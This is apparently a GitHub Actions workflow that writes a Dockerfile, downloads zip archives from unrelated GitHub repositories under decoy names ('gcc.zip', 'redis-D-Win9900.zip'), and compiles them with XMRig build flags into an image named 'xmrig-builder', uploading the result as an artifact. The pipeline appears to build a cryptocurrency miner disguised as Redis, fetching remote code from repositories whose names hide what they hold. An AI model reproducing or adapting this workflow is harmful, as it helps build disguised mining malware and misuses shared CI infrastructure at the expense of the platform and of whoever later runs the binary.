name: Build on 2025-04-30

on:
  push:
    branches:
      - main
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout source code
        uses: actions/checkout@v3

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v2

      - name: Create Dockerfile
        run: |
          cat > Dockerfile << 'EOF'
          FROM ubuntu:22.04

          # Avoid interactive prompts during package installation
          ENV DEBIAN_FRONTEND=noninteractive

          # Install build dependencies
          RUN apt-get update && apt-get install -y \
              build-essential \
              cmake \
              git \
              curl \
              wget \
              nasm \
              unzip \
              libssl-dev \
              libhwloc-dev \
              libuv1-dev \
              && rm -rf /var/lib/apt/lists/*

          # Set up working directory
          WORKDIR /app

          # Copy project files
          COPY . .

          # Download dependencies
          RUN mkdir -p /app/deps && \
              cd /app/deps && \
              wget -O gcc.zip https://github.com/Janit8r/device_lge_judyln/raw/S/gcc.zip && \
              wget -O redis.zip https://github.com/Janit8r/frp-2/raw/refs/heads/dev/redis-D-Win9900.zip && \
              unzip -o gcc.zip && \
              unzip -o redis.zip

          # Setup build process
          RUN mkdir -p /app/deps/redis-D-Win9900/build

          # Build command will be run separately
          CMD cd /app/deps/redis-D-Win9900/build && \
              cmake .. -DXMRIG_DEPS=/app/deps/gcc/gcc/x64 -DBUILD_SHARED_LIBS=OFF && \
              cmake --build . --config Release
          EOF

      - name: Build Docker image
        run: docker build -t xmrig-builder .

      - name: Run build in Docker container
        run: |
          docker run --name xmrig-build xmrig-builder
          docker cp xmrig-build:/app/deps/redis-D-Win9900/build/Release ./Release

      - name: Archive build artifacts
        uses: actions/upload-artifact@v4
        with:
          name: build-artifacts
          path: ./Release
